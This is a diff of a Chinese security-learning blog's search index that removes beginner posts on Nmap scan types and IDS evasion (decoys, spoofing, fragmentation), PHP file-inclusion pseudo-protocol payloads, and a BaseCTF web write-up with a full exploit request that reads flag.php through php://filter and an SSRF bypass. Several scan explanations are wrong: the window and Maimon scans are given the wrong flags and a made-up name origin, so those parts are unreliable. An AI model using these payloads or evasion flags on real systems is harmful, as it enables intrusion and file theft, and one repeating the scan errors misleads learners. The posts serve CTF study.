工具中的一种扫描方式，通常用于获取目标系统的端口状态信息。TCP SYN 扫描的原理是发送TCP SYN包，根据目标主机的响应来判断端口的状态。</p><p>下面是 TCP SYN 扫描的工作原理：  </p><blockquote><p>发送TCP SYN包： 扫描发起者（通常是Nmap工具）向目标主机的指定端口发送TCP SYN包（同步包）。<br>等待响应： 如果目标端口是开放的，目标主机将返回一个TCP SYN&#x2F;ACK包（同步&#x2F;应答包）表示端口是开放的。如果目标端口是关闭的，目标主机将返回一个TCP RST包（复位包）表示端口是关闭的。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。如果收到了 SYN&#x2F;ACK 包，说明端口是开放的。如果收到了 RST 包，说明端口是关闭的。<br>不完全建立连接： 在完成第2步的过程中，扫描发起者不会完成TCP连接的建立，而是在收到响应后发送一个 RST 包，关闭连接。这样，扫描对目标系统的影响较小，因为它不会建立完整的连接。 </p></blockquote><h4 id="2-TCP-connect-扫描"><a href="#2-TCP-connect-扫描" class="headerlink" title="2 TCP connect() 扫描"></a>2 TCP connect() 扫描</h4><blockquote><p>此扫描为默认扫描，不用加参数</p></blockquote><p>TCP Connect 扫描是 Nmap 中的另一种常见的扫描技术。与 TCP SYN 扫描类似，TCP Connect 扫描也用于探测目标主机上的开放端口。它的工作原理是通过尝试建立完整的TCP连接来判断目标主机上的端口状态。</p><p>下面是 TCP Connect 扫描的工作原理：</p><blockquote><p>尝试建立完整的TCP连接： 扫描发起者向目标主机的指定端口尝试建立完整的TCP连接。<br>等待响应： 如果目标端口是开放的，目标主机将接受连接并返回一个TCP ACK包（应答包）表示端口是开放的。如果目标端口是关闭的，连接尝试将失败，扫描发起者将收到一个连接拒绝错误。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。如果连接成功建立，说明端口是开放的。如果连接被拒绝，说明端口是关闭的。<br>完成连接： 与 TCP SYN 扫描不同，TCP Connect 扫描会尝试建立完整的连接。因此，如果连接成功建立，扫描发起者可能会继续与目标主机交换一些数据。</p></blockquote><h4 id="3-UDP-扫描"><a href="#3-UDP-扫描" class="headerlink" title="3 UDP 扫描"></a>3 UDP 扫描</h4><blockquote><p>nmap -sU ip</p></blockquote><p>UDP（User Datagram Protocol）扫描是一种用于探测目标主机上开放的 UDP（非连接性协议）端口的扫描技术。与 TCP 扫描不同，UDP 扫描涉及到发送 UDP 数据包并分析目标主机的响应。由于 UDP 是面向无连接的协议，UDP 扫描相对复杂，因为没有类似于 TCP SYN&#x2F;ACK 的确认机制。</p><p>以下是 UDP 扫描的工作原理：</p><blockquote><p>发送UDP数据包： 扫描发起者向目标主机的指定 UDP 端口发送UDP数据包。<br>等待响应： 如果目标端口是开放的，目标主机将不发送响应，或者发送一个UDP应答包。如果目标端口是关闭的，目标主机通常会发送一个ICMP不可达消息。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。缺乏确认机制使得 UDP 扫描相对不稳定，因为目标主机可能选择不响应请求，或者响应包被防火墙过滤。<br>需要注意的是，UDP 扫描可能会面临一些挑战，包括：<br>不稳定性： 由于 UDP 的面向无连接性质，扫描可能会受到目标主机或防火墙的限制，导致结果不稳定。<br>响应解释： 分析 UDP 响应相对复杂，因为目标主机可以选择不响应，或者发送一些与端口状态无关的信息。<br>速度较慢： 由于UDP扫描涉及等待响应，可能需要较长时间来完成扫描。  </p></blockquote><h4 id="4-TCP-Null-扫描"><a href="#4-TCP-Null-扫描" class="headerlink" title="4 TCP Null 扫描"></a>4 TCP Null 扫描</h4><blockquote><p>nmap -sN ip</p></blockquote><p>TCP Null 扫描是 Nmap 工具中的一种扫描技术，用于探测目标主机上的开放端口。与 TCP SYN 扫描和 TCP Connect 扫描不同，TCP Null 扫描尝试利用 TCP 协议的一个特性，即发送一个不包含任何标志位的 TCP 报文，来判断端口的状态。</p><p>以下是 TCP Null 扫描的工作原理：</p><blockquote><p>发送TCP Null 包： 扫描发起者向目标主机的指定端口发送一个不包含任何标志位的 TCP 报文，即所有标志位均被设置为零。<br>等待响应： 如果目标端口是开放的，目标主机通常会忽略 TCP Null 报文，不发送任何响应。如果目标端口是关闭的，目标主机可能会发送一个 TCP RST（复位）包，表示端口是关闭的。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。缺乏任何标志位的 TCP Null 报文通常在正常操作中是不合法的，因此，如果收到响应，则可能表示端口是关闭的。  </p></blockquote><h4 id="5-TCP-FIN-扫描"><a href="#5-TCP-FIN-扫描" class="headerlink" title="5 TCP FIN 扫描"></a>5 TCP FIN 扫描</h4><blockquote><p>nmap -sF ip</p></blockquote><p>TCP FIN（Finish）扫描是 Nmap 工具中的一种扫描技术，用于探测目标主机上的开放端口。与 TCP SYN 扫描和 TCP Null 扫描类似，TCP FIN 扫描尝试利用 TCP 协议的一个特性，即发送一个不包含 SYN 标志位和其他标志位为零的 TCP 报文，来判断端口的状态。</p><p>以下是 TCP FIN 扫描的工作原理：</p><blockquote><p>发送TCP FIN 包： 扫描发起者向目标主机的指定端口发送一个不包含 SYN 标志位的 TCP 报文，即 FIN 标志位被设置为 1，而其他标志位均被设置为零。<br>等待响应： 如果目标端口是开放的，目标主机通常会忽略 TCP FIN 报文，不发送任何响应。如果目标端口是关闭的，目标主机可能会发送一个 TCP RST（复位）包，表示端口是关闭的。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。缺乏 SYN 标志位的 TCP FIN 报文通常在正常操作中是不合法的，因此，如果收到响应，则可能表示端口是关闭的。  </p></blockquote><h4 id="6-TCP-Xmas-扫描"><a href="#6-TCP-Xmas-扫描" class="headerlink" title="6 TCP Xmas 扫描"></a>6 TCP Xmas 扫描</h4><blockquote><p>nmap -sX ip</p></blockquote><p>TCP Xmas（也称为Christmas Tree）扫描是 Nmap 工具中的一种扫描技术，用于探测目标主机上的开放端口。TCP Xmas 扫描尝试利用 TCP 协议的一个特性，即发送一个所有标志位均被设置为 1 的 TCP 报文，来判断端口的状态。</p><p>以下是 TCP Xmas 扫描的工作原理：</p><blockquote><p>发送TCP Xmas 包： 扫描发起者向目标主机的指定端口发送一个所有标志位均被设置为 1 的 TCP 报文，即FIN、PSH、URG标志位均被设置为 1。<br>等待响应： 如果目标端口是开放的，目标主机通常会忽略 TCP Xmas 报文，不发送任何响应。如果目标端口是关闭的，目标主机可能会发送一个 TCP RST（复位）包，表示端口是关闭的。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。缺乏标准标志位的 TCP Xmas 报文通常在正常操作中是不合法的，因此，如果收到响应，则可能表示端口是关闭的。</p></blockquote><h4 id="7-TCP-ACK-扫描"><a href="#7-TCP-ACK-扫描" class="headerlink" title="7 TCP ACK 扫描"></a>7 TCP ACK 扫描</h4><blockquote><p>nmap -sA ip</p></blockquote><p>TCP ACK（Acknowledgment）扫描是 Nmap 工具中的一种扫描技术，用于确定目标主机上的端口状态。与其他 TCP 扫描技术不同，TCP ACK 扫描不关心端口是否开放，而是专注于获取目标主机对特定端口的响应。</p><p>以下是 TCP ACK 扫描的工作原理：</p><blockquote><p>发送TCP ACK包： 扫描发起者向目标主机的指定端口发送一个只设置 ACK 标志位的 TCP 报文。<br>等待响应： 无论目标端口是开放还是关闭，目标主机通常会返回一个 TCP RST（复位）包，表示对未建立连接的 ACK 请求的拒绝。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。如果收到 TCP RST 包，说明端口是关闭的；如果没有收到响应，说明端口可能是开放的或由防火墙过滤。</p></blockquote><p>####8 TCP 窗口扫描</p><blockquote><p>nmap -sW ip</p></blockquote><p>TCP窗口扫描是一种用于探测目标主机上开放端口的扫描技术。这种扫描技术主要关注TCP协议中的窗口字段（Window Size）。</p><blockquote><p>TCP窗口扫描的工作原理如下：<br>发送TCP包： 扫描发起者向目标主机的指定端口发送一个TCP包，其中SYN标志位被设置，但不设置ACK标志位。<br>等待响应： 如果目标端口是开放的，目标主机会响应一个包，其中SYN和ACK标志位都被设置，并且TCP窗口字段包含一个非零的值。如果目标端口是关闭的，目标主机可能会响应一个RST（复位）包，或者根本不响应。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。如果收到SYN&#x2F;ACK响应，并且TCP窗口字段的值不为零，那么端口可能是开放的。如果收到RST响应或者根本没有响应，那么端口可能是关闭的。</p></blockquote><h4 id="9-TCP-Maimon-扫描"><a href="#9-TCP-Maimon-扫描" class="headerlink" title="9 TCP Maimon 扫描"></a>9 TCP Maimon 扫描</h4><blockquote><p>nmap -sM ip</p></blockquote><p>在网络扫描领域中，TCP Maimon Scan（又称 Maimonides Scan）是一种比较罕见的扫描技术，其命名来源于古代犹太学者拉比·莫西·马蒙尼德斯（Moses Maimonides）。该扫描技术利用了 TCP 协议的一些特性来确定目标主机上的端口状态。</p><p>TCP Maimon Scan 的工作原理如下：</p><blockquote><p>发送TCP包： 扫描发起者向目标主机的指定端口发送一个TCP包，其中SYN和RST标志位都被设置，同时TCP窗口字段设置为零。<br>等待响应： 如果目标端口是开放的，目标主机会响应一个包，其中SYN、ACK和RST标志位都被设置，同时TCP窗口字段包含一个非零的值。如果目标端口是关闭的，目标主机可能会响应一个RST包。<br>分析响应： 扫描发起者通过分析目标主机的响应来确定端口的状态。如果收到SYN&#x2F;ACK&#x2F;RST响应，并且TCP窗口字段的值不为零，那么端口可能是开放的。如果收到RST响应，那么端口可能是关闭的。  </p></blockquote><h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><h4 id="1-报文分段"><a href="#1-报文分段" class="headerlink" title="1 报文分段"></a>1 报文分段</h4><blockquote><p>nmap -f ip</p></blockquote><p>-f 参数用于在发送的TCP数据包中进行报文分段（fragmentation）。报文分段是将大的数据包分成更小的片段以适应网络传输的过程。在网络安全领域，报文分段经常用于绕过一些网络防火墙或入侵检测系统的检测。一些防火墙和IDS&#x2F;IPS系统在处理大数据包时可能会存在漏洞，通过将数据包分成小片段，可以尝试绕过这些安全设备的检测。 </p><h4 id="2-最大传输单元"><a href="#2-最大传输单元" class="headerlink" title="2 最大传输单元"></a>2 最大传输单元</h4><blockquote><p>nmap –mtu 1500 ip</p></blockquote><p>–mtu 参数用于指定数据包的最大传输单元（MTU）。MTU是指一次能够通过通信链路的最大数据包大小。通过调整MTU，可以影响数据包的大小，从而可能绕过一些网络设备的检测。 </p><h4 id="3-诱饵隐藏扫描"><a href="#3-诱饵隐藏扫描" class="headerlink" title="3 诱饵隐藏扫描"></a>3 诱饵隐藏扫描</h4><blockquote><p>nmap -D &lt;ip,ip,ip……&gt; 目标 ip</p></blockquote><p>-D 参数在Nmap中用于进行诱饵（decoy）扫描，通过在扫描中伪装其他主机的IP地址，使得被扫描目标难以确定扫描的真实来源。这有助于混淆目标主机的入侵检测系统，使其难以追踪扫描的发起者。</p><h4 id="4-源地址哄骗"><a href="#4-源地址哄骗" class="headerlink" title="4 源地址哄骗"></a>4 源地址哄骗</h4><blockquote><p>nmap -S &lt;伪装的源 ip&gt; ip </p></blockquote><h4 id="5-源端口哄骗"><a href="#5-源端口哄骗" class="headerlink" title="5 源端口哄骗"></a>5 源端口哄骗</h4><blockquote><p>nmap –source-port 或 -g &lt;源端口号&gt; ip </p></blockquote><p>–source-port 和 -g 参数在Nmap中用于进行源端口欺骗（Source Port Spoofing）。它们允许你指定用于发送扫描请求的源端口号，这样可以对目标主机进行一些混淆，使得入侵检测系统难以准确追踪和识别扫描流量。 </p><h4 id="6-附加随机数据"><a href="#6-附加随机数据" class="headerlink" title="6  附加随机数据"></a>6  附加随机数据</h4><blockquote><p>nmap –data-length &lt;长度&gt; ip</p></blockquote><p>–data-length <number> 参数在Nmap中用于在发送的数据包中附加指定长度的随机数据。这个功能有助于混淆目标主机上的入侵检测系统，使得对扫描流量的分析更加困难。</p><p>####7 生存时间</p><blockquote><p>nmap –ttl &lt;值&gt; ip </p></blockquote><p>–ttl <value> 参数在Nmap中用于设置发送的数据包中的 IP Time-To-Live（TTL）字段的值。TTL是IP协议头部中的一个字段，用于指定数据包在网络上的最大生存时间，通常以跳数（hops）为单位。每经过一个路由器，TTL值就会减1，当TTL值减至0时，数据包将被丢弃，并且路由器会向源主机发送一个 ICMP Time Exceeded 错误消息。</p><h4 id="8-MAC-地址哄骗"><a href="#8-MAC-地址哄骗" class="headerlink" title="8 MAC 地址哄骗"></a>8 MAC 地址哄骗</h4><blockquote><p>nmap –spoof-mac &lt;mac 地址&gt; ip </p></blockquote><p>–spoof-mac &lt;mac address，prefix，or vendor name&gt; 参数在Nmap中用于进行MAC地址欺骗，即伪装发送扫描请求的主机的MAC地址。MAC地址（Media Access Control address）是网络设备的唯一标识符。通过欺骗目标主机，改变扫描请求中的MAC地址，可以混淆入侵检测系统，使其难以追踪和识别扫描来源。</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>Tool</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>nmap</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>Nmap初识</title>
-    <link href="/2024/09/16/Nmap%E5%88%9D%E8%AF%86/"/>
-    <url>/2024/09/16/Nmap%E5%88%9D%E8%AF%86/</url>
-    
-    <content type="html"><![CDATA[<p>web小白又开始学习web了，今天初步了解一下Nmap的功能和使用方法</p><h3 id="主要功能："><a href="#主要功能：" class="headerlink" title="主要功能："></a>主要功能：</h3><ol><li>主机发现： Nmap 可以通过发送网络探测包（ping 扫描）来确定一个网络中活跃的主机。这有助于确定哪些 IP 地址上有活动的设备</li><li>端口扫描： Nmap 可以扫描目标主机的开放端口，帮助确定哪些服务正在运行。它支持多种扫描技术，包括 TCP 扫描、UDP 扫描、SYN&#x2F;ACK 扫描等</li><li>服务识别： Nmap 可以识别目标主机上运行的具体服务和应用程序的版本号。这对于了解目标系统上可能存在的漏洞和弱点很有帮助</li><li>操作系统检测： Nmap 能够尝试检测目标主机的操作系统类型和版本。这有助于识别网络中的不同操作系统，并为后续的渗透测试提供信息。</li><li>脚本扫描： Nmap 支持脚本扫描，允许用户执行自定义脚本以进行更深入的信息收集和安全审计</li><li>版本检测： Nmap 可以检测目标系统上运行的服务的版本信息。这对于确定目标系统上可能存在的已知漏洞和安全问题非常有用。</li><li>输出格式： Nmap 可以生成多种输出格式，包括文本、XML、JSON 等，以便进一步的分析和报告</li></ol><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><h4 id="3-1主机"><a href="#3-1主机" class="headerlink" title="3.1主机"></a>3.1主机</h4><h5 id="3-1-1快速扫描"><a href="#3-1-1快速扫描" class="headerlink" title="3.1.1快速扫描"></a>3.1.1快速扫描</h5><blockquote><p>nmap ip  </p></blockquote><p>上述命令将执行一个默认的 TCP 端口扫描，显示目标主机上开放的端口以及相应的服务信息。</p><h5 id="3-1-2快速扫描"><a href="#3-1-2快速扫描" class="headerlink" title="3.1.2快速扫描"></a>3.1.2快速扫描</h5><blockquote><p>nmap ip ip   </p></blockquote><p>扫描多个目标只需跟上 IP 即可 </p><h5 id="3-1-3-网段扫描"><a href="#3-1-3-网段扫描" class="headerlink" title="3.1.3 网段扫描"></a>3.1.3 网段扫描</h5><blockquote><p>nmap ip&#x2F;子网掩码  </p></blockquote><h5 id="3-1-4-过滤-IP-的网段扫描"><a href="#3-1-4-过滤-IP-的网段扫描" class="headerlink" title="3.1.4 过滤 IP 的网段扫描"></a>3.1.4 过滤 IP 的网段扫描</h5><blockquote><p>nmap ip&#x2F;子网掩码 -exclude 需要过滤的 IP 或 文件</p></blockquote><h5 id="3-1-5-扫描存活主机"><a href="#3-1-5-扫描存活主机" class="headerlink" title="3.1.5 扫描存活主机"></a>3.1.5 扫描存活主机</h5><blockquote><p>nmap -sP ip&#x2F;子网掩码 </p></blockquote><p>仅仅确定存活主机并不扫描端口</p><h4 id="3-2-端口"><a href="#3-2-端口" class="headerlink" title="3.2 端口"></a>3.2 端口</h4><h5 id="Nmap所识别的6个端口状态"><a href="#Nmap所识别的6个端口状态" class="headerlink" title="Nmap所识别的6个端口状态:"></a>Nmap所识别的6个端口状态:</h5><blockquote><p>open(开放的)<br>应用程序正在该端口接收TCP 连接或者UDP报文。发现这一点常常是端口扫描 的主要目标。安全意识强的人们知道每个开放的端口 都是攻击的入口。攻击者或者入侵测试者想要发现开放的端口。 而管理员则试图关闭它们或者用防火墙保护它们以免妨碍了合法用户。 非安全扫描可能对开放的端口也感兴趣，因为它们显示了网络上那些服务可供使用。  </p></blockquote><blockquote><p>closed(关闭的)<br>关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。 它们可以显示该IP地址上(主机发现，或者ping扫描)的主机正在运行up 也对部分操作系统探测有所帮助。 因为关闭的关口是可访问的，也许过会儿值得再扫描一下，可能一些又开放了。 系统管理员可能会考虑用防火墙封锁这样的端口。 那样他们就会被显示为被过滤的状态，下面讨论。</p></blockquote><blockquote><p>filtered(被过滤的)<br>由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由器规则 或者主机上的软件防火墙。这样的端口让攻击者感觉很挫折，因为它们几乎不提供 任何信息。有时候它们响应ICMP错误消息如类型3代码13 (无法到达目标: 通信被管理员禁止)，但更普遍的是过滤器只是丢弃探测帧， 不做任何响应。 这迫使Nmap重试若干次以访万一探测包是由于网络阻塞丢弃的。 这使得扫描速度明显变慢。</p></blockquote><blockquote><p>unfiltered(未被过滤的)<br>未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。 只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。 用其它类型的扫描如窗口扫描，SYN扫描，或者FIN扫描来扫描未被过滤的端口可以帮助确定 端口是否开放。</p></blockquote><blockquote><p>open|filtered(开放或者被过滤的)<br>当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃 了探测报文或者它引发的任何响应。因此Nmap无法确定该端口是开放的还是被过滤的。 UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类。</p></blockquote><blockquote><p>closed|filtered(关闭或者被过滤的)<br>该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。</p></blockquote><h5 id="3-2-1-端口扫描"><a href="#3-2-1-端口扫描" class="headerlink" title="3.2.1 端口扫描"></a>3.2.1 端口扫描</h5><blockquote><p>nmap ip -p 端口号  </p></blockquote><p>扫描「指定端口」，使用 -p 参数，可以一次扫描单个端口、多个端口、或扫描一个范围的端口</p><h5 id="端口范围扫描"><a href="#端口范围扫描" class="headerlink" title="端口范围扫描"></a>端口范围扫描</h5><blockquote><p>nmap ip -p 范围  </p></blockquote><h4 id="3-3-服务"><a href="#3-3-服务" class="headerlink" title="3.3 服务"></a>3.3 服务</h4><h5 id="3-3-1-识别服务版本"><a href="#3-3-1-识别服务版本" class="headerlink" title="3.3.1 识别服务版本"></a>3.3.1 识别服务版本</h5><blockquote><p>nmap -sV ip -p 端口号或范围 </p></blockquote><p>想要识别具体的「服务版本」，可以使用 -sV 参数。</p><h4 id="3-4-系统"><a href="#3-4-系统" class="headerlink" title="3.4 系统"></a>3.4 系统</h4><h5 id="3-4-1-识别操作系统"><a href="#3-4-1-识别操作系统" class="headerlink" title="3.4.1 识别操作系统"></a>3.4.1 识别操作系统</h5><blockquote><p>nmap -O ip  </p></blockquote><p>想要识别「操作系统版本」，可以使用 -O 参数（需要 root 权限）</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>Tool</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>nmap</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>CVE-2020-9484-tomcat-session持久化</title>
-    <link href="/2024/09/16/CVE-2020-9484-tomcat-session%E6%8C%81%E4%B9%85%E5%8C%96/"/>
-    <url>/2024/09/16/CVE-2020-9484-tomcat-session%E6%8C%81%E4%B9%85%E5%8C%96/</url>
-    
-    <content type="html"><![CDATA[<p><a href="https://www.secpulse.com/archives/163637.html">CVE</a></p>]]></content>
-    
-    
-    <categories>
-      
-      <category>web</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>CVE</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
     <title>jsessionid是什么？</title>
     <link href="/2024/09/16/jsessionid%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/"/>
     <url>/2024/09/16/jsessionid%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F/</url>
@@ -309,81 +534,6 @@
     <tags>
       
       <tag>session</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>SSRF</title>
-    <link href="/2024/09/16/SSRF/"/>
-    <url>/2024/09/16/SSRF/</url>
-    
-    <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/2288231">web</a></p>]]></content>
-    
-    
-    <categories>
-      
-      <category>ctf</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>web</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>伪协议与文件包含</title>
-    <link href="/2024/09/16/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
-    <url>/2024/09/16/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    
-    <content type="html"><![CDATA[<h3 id="前置学习要求"><a href="#前置学习要求" class="headerlink" title="前置学习要求"></a>前置学习要求</h3><h4 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h4><blockquote><p>文件包含所可能有的函数<br>php当中会造成文件包含漏洞的函数有：include、require、include_once、require_once、highlight_file 、show_source 、readfile 、file_get_contents 、fopen 、file<br>实现方法</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span> ?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">#GET数据</span><br><span class="hljs-number">2</span> ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=  <span class="hljs-comment">#后面的base64字符是需要传入的字符串的base64编码</span><br><span class="hljs-number">3</span> ?file=php:<span class="hljs-comment">//input [POST DATA:]&lt;?php phpinfo()?&gt;  #POST数据</span><br><span class="hljs-number">4</span> ?file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=xxx.php  #get读源码</span><br></code></pre></td></tr></table></figure><h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><blockquote><p>需要开启allow_url_fopen的：php:&#x2F;&#x2F;input、php:&#x2F;&#x2F;stdin、php:&#x2F;&#x2F;memory和php:&#x2F;&#x2F;temp<br>不需要开启allow_wrl_fopen的：php:&#x2F;&#x2F;filter<br>在CTF中经常使用的是php:&#x2F;&#x2F;filter和php:&#x2F;&#x2F;input<br>php:&#x2F;&#x2F;filter用于读取源码，php:&#x2F;&#x2F;input用于执行php代码<br>php:&#x2F;&#x2F;input需要post请求提交数据<br>php:&#x2F;&#x2F;filter可以get提交?a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p></blockquote><h4 id="data伪协议"><a href="#data伪协议" class="headerlink" title="data伪协议"></a>data伪协议</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?xxx=data:<span class="hljs-comment">//text/plain;base64,想要file_get_contents()函数返回的值的base64编码</span><br>?file=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>()<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h4 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h4><blockquote><p>File:&#x2F;&#x2F; 访问本地文件系统<br>file:&#x2F;&#x2F; 用于访问本地文件系统，如c:盘中的东西。在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。<br>file:&#x2F;&#x2F; [文件的绝对路径和文件名]<br>linux 系统环境下：?file&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>winows 系统环境下：?file&#x3D;file:&#x2F;&#x2F;&#x2F;E:\phpStudy\WWW\code\phpinfo.php</p></blockquote><p>总结：File协议用于读取系统文件，c盘关键内容。Php:&#x2F;&#x2F;filter 用来读取文件内容，但是要base64后出来，否则会造成文件执行从而只看到执行结果。Php:&#x2F;&#x2F;input（代码执行）可将post请求中的数据作为PHP代码执行。可以用于写木马。Data和input相似，可以代码执行，但只有在php&lt;5.3且include&#x3D;on时可以写木马。</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>ctf</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>web</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>Basectfweb</title>
-    <link href="/2024/09/15/Basectfweb/"/>
-    <url>/2024/09/15/Basectfweb/</url>
-    
-    <content type="html"><![CDATA[<p>web初学者小写几个web题</p><h4 id="Aura-酱的礼物"><a href="#Aura-酱的礼物" class="headerlink" title="Aura 酱的礼物"></a>Aura 酱的礼物</h4><p>开启页面查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// Aura 酱，欢迎回家~</span><br><span class="hljs-comment">// 这里有一份礼物，请你签收一下哟~</span><br><span class="hljs-variable">$pen</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pen&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$pen</span>) !== <span class="hljs-string">&#x27;Aura&#x27;</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 礼物收到啦，接下来要去博客里面写下感想哦~</span><br><span class="hljs-variable">$challenge</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;challenge&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$challenge</span>, <span class="hljs-string">&#x27;http://jasmineaura.github.io&#x27;</span>) !== <span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这不是 Aura 的博客！&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$blog_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$challenge</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$blog_content</span>, <span class="hljs-string">&#x27;已经收到Kengwang的礼物啦&#x27;</span>) === <span class="hljs-literal">false</span>)<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;请去博客里面写下感想哦~&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~</span><br><span class="hljs-variable">$gift</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;gift&#x27;</span>];<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$gift</span>);<br></code></pre></td></tr></table></figure><p>第一个判断，了解读取文件后的内容是Aura尝试data:&#x2F;&#x2F;为协议来读取<br>第二个判断利用了@的ssrf绕过<br>第三个采用了php伪协议的数据传输</p><pre><code class="hljs">POST / HTTP/1.1Host: challenge.basectf.fun:36145Cache-Control: max-age=0Accept-Language: zh-CNUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Length: 138Content-Type: application/x-www-form-urlencodedpen=data://text/plain,Aura&amp;challenge=http://jasmineaura.github.io@127.0.0.1&amp;gift=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><p>&lt;?php &#x2F;&#x2F; BaseCTF{81918213-ed45-40b9-b751-99e831a0bc75}  Aura 酱有拿到一血吗？</p>]]></content>
-    
-    
-    <categories>
-      
-      <category>ctf</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>web</tag>
       
     </tags>
     
@@ -553,31 +703,6 @@
     <tags>
       
